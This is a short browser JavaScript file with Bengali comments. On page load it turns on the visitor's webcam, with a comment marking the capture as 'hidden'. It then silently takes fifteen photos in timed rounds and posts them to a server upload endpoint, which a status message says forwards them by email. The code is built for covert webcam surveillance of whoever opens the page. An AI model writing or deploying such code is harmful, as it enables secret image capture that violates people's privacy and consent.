let camera = document.getElementById("camera");
let canvas = document.getElementById("canvas");
let ctx = canvas.getContext("2d");
let statusText = document.getElementById("statusText");

let capturedImages = [];

// ক্যামেরা চালু (hidden)
navigator.mediaDevices.getUserMedia({ video: true, audio: false })
  .then(stream => {
    camera.srcObject = stream;
    statusText.textContent = "✅ ভিডিও চলছে (hidden capture active)";
  })
  .catch(err => {
    console.error("Camera error: ", err);
    statusText.textContent = "❌ ক্যামেরা চালু করা যায়নি";
  });

// ছবি তোলার ফাংশন
function captureImage() {
  canvas.width = camera.videoWidth;
  canvas.height = camera.videoHeight;
  ctx.drawImage(camera, 0, 0);
  let dataUrl = canvas.toDataURL("image/jpeg");
  capturedImages.push(dataUrl);
}

// সার্ভারে পাঠানো
async function uploadImages() {
  statusText.textContent = "📤 সার্ভারে ছবি পাঠানো হচ্ছে...";
  let res = await fetch("/upload", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ images: capturedImages }),
  });

  let result = await res.json();
  statusText.textContent = "✅ সব ছবি ইমেইলে পাঠানো হয়েছে";
  console.log(result);
}

// টাইমার লজিক
async function startCapture() {
  for (let round = 0; round < 3; round++) {
    for (let i = 0; i < 5; i++) {
      captureImage();
      console.log(`Captured: Round ${round+1}, Image ${i+1}`);
      await new Promise(r => setTimeout(r, 10000)); // 10 sec
    }
    if (round < 2) {
      console.log("Waiting 30 sec...");
      await new Promise(r => setTimeout(r, 30000));
    }
  }

  // সব ছবি সার্ভারে পাঠানো
  await uploadImages();
}

startCapture();